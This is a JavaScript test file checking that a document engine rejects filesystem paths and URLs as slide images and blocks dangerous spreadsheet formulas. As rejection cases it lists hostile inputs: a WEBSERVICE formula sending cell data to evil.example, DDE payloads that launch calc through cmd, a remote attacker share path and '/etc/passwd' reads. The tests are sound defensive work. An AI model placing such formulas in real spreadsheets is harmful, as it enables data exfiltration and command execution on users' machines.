// DB isolation: keep test writes out of the production ~/.konoha/konoha.db
require('./helpers/isolate_db');

'use strict';

const assert = require('assert');
const fs = require('fs');
const os = require('os');
const path = require('path');

const ROOT = path.resolve(__dirname, '..');
const SCRIBE = path.join(ROOT, 'src', 'workflow', 'tokubetsu-scribe');

const { sanitizeFormula } = require(path.join(SCRIBE, 'doc_engine_spreadsheet.js'));
const { addInlineImage } = require(path.join(SCRIBE, 'doc_engine_presentation.js'));
const { resolveDynamicOutputPath } = require(path.join(SCRIBE, 'document_engine_common.js'));

console.log('Running test_document_engine_security: presentation + spreadsheet boundaries...');

// pptxgenjs reads `path` from disk and GETs `http*` over the network. The engine must
//    never hand it either: only an in-memory PNG buffer is accepted.
{
  const calls = [];
  const slide = { addImage: (opt) => calls.push(opt) };
  const png = Buffer.concat([Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), Buffer.alloc(8)]);

  addInlineImage(slide, png);
  assert.strictEqual(calls.length, 1, 'a PNG buffer must produce exactly one addImage call');
  assert.strictEqual(calls[0].path, undefined, 'addImage must never receive a filesystem path');
  assert.ok(/^image\/png;base64,/.test(calls[0].data), 'addImage must receive an inline base64 data URI');

  for (const hostile of ['/etc/passwd', 'https://evil.example/x.png', 'file:///etc/passwd', '', null, undefined, 42, { path: '/etc/passwd' }]) {
    assert.throws(
      () => addInlineImage(slide, hostile),
      /in-memory PNG buffer/,
      `non-buffer payload ${JSON.stringify(hostile)} must be rejected before addImage`
    );
  }
  assert.throws(() => addInlineImage(slide, Buffer.from('not a png')), /in-memory PNG buffer/);
  assert.strictEqual(calls.length, 1, 'rejected payloads must not reach addImage');
  console.log('  ok   presentation images are in-memory PNG only, no path/URL surface');
}

// Spreadsheet formulas: DDE/OLE/remote-fetch functions must be rejected outright.
{
  const blocked = [
    '=WEBSERVICE("https://evil.example/?d="&A1)',
    '=ENCODEURL(A1)',
    '=HYPERLINK("https://evil.example","click")',
    '=CALL("kernel32","GetTickCount","J")',
    '=REGISTER.ID("kernel32","GetTickCount","J")',
    '=DDE("cmd";"/c calc";"__DdeLink__0_1")',
    '=SQL.REQUEST("DSN=x",1,2)',
    'webservice("https://evil.example")'
  ];
  for (const formula of blocked) {
    assert.throws(() => sanitizeFormula(formula), /Formula rejected: function not allowed/, `${formula} must be rejected`);
  }

  // The DDE link operator carries the same payload without any blocked name.
  const blockedLinks = [
    "=cmd|' /C calc'!A0",
    "=cmd|'/c calc'!A0",
    "=msexcel|'\\\\attacker\\share\\payload.xlsx'!A0",
    '=|calc!A0'
  ];
  for (const formula of blockedLinks) {
    assert.throws(() => sanitizeFormula(formula), /Formula rejected: DDE link operator/, `${formula} must be rejected`);
  }

  assert.strictEqual(sanitizeFormula('=SUM(B8:B10)'), 'SUM(B8:B10)', 'arithmetic must pass through');
  assert.strictEqual(sanitizeFormula('=Sheet2!A1+1'), 'Sheet2!A1+1', 'cross-sheet references must pass through');
  assert.strictEqual(sanitizeFormula('="a|b"'), '"a|b"', 'a pipe inside a string literal must pass through');
  assert.strictEqual(sanitizeFormula(' SUM(A1:A3) '), 'SUM(A1:A3)', 'whitespace is trimmed');
  assert.strictEqual(sanitizeFormula(42), '', 'non-strings degrade to an empty formula');
  assert.strictEqual(sanitizeFormula(null), '');
  console.log('  ok   spreadsheet formulas reject DDE/OLE/remote-fetch functions');
}

// Output paths: absolute paths resolve verbatim, relative paths resolve against cwd,
//    and the parent directory is created. This is the documented CLI/MCP contract.
{
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'konoha-docpath-'));
  try {
    const absolute = path.join(tmp, 'a', 'b', 'deck.pptx');
    assert.strictEqual(resolveDynamicOutputPath(absolute, 'x.pptx'), absolute);
    assert.ok(fs.statSync(path.join(tmp, 'a', 'b')).isDirectory(), 'parent dirs must be created');

    // A relative path resolves against process.cwd(), so the leg runs with cwd
    // inside the temp dir — otherwise the assertion leaves rel/sub/ in the repo.
    const cwdBefore = process.cwd();
    process.chdir(tmp);
    try {
      const relative = resolveDynamicOutputPath(path.join('rel', 'sub', 'sheet.xlsx'), 'x.xlsx');
      assert.strictEqual(relative, path.resolve('rel', 'sub', 'sheet.xlsx'));
      assert.ok(fs.statSync(path.join(tmp, 'rel', 'sub')).isDirectory(), 'relative parents must be created too');
    } finally {
      process.chdir(cwdBefore);
    }

    assert.strictEqual(resolveDynamicOutputPath(undefined, 'fallback.pptx'), path.resolve('output', 'fallback.pptx'));
    assert.strictEqual(resolveDynamicOutputPath('', 'fallback.pptx'), path.resolve('output', 'fallback.pptx'));
  } finally {
    fs.rmSync(tmp, { recursive: true, force: true });
  }
  console.log('  ok   output paths resolve and create parents without escaping the contract');
}

// Static invariant: the presentation engine has exactly one addImage call site, and it
//    is inside the guarded helper.
{
  const source = fs.readFileSync(path.join(SCRIBE, 'doc_engine_presentation.js'), 'utf8');
  const sites = source.match(/\.addImage\s*\(/g) || [];
  assert.strictEqual(sites.length, 1, 'exactly one addImage call site is allowed');
  assert.ok(
    /function addInlineImage\(slide, buffer[\s\S]{0,600}?slide\.addImage\(\{ data:/.test(source),
    'the single addImage call must live inside addInlineImage and pass only `data`'
  );
  assert.ok(!/addImage\([^)]*\bpath\s*:/.test(source), 'no addImage call may pass a `path`');
  console.log('  ok   single guarded addImage call site');
}

console.log('\nAll test_document_engine_security checks passed successfully!');
